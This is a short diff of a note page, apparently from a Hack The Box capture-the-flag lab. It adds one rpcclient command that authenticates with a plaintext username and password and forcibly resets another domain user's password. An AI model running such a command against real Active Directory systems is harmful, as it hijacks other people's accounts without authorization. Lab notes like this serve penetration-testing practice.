@@ -1,7 +1,7 @@
 [[Editing Copy Page]]
 
 ```
-
+rpcclient -U 'administrator.htb/olivia%ichliebedich' 10.129.44.84 -c 'setuserinfo2 michael 23 "pass123"'
 ```
 
 ```
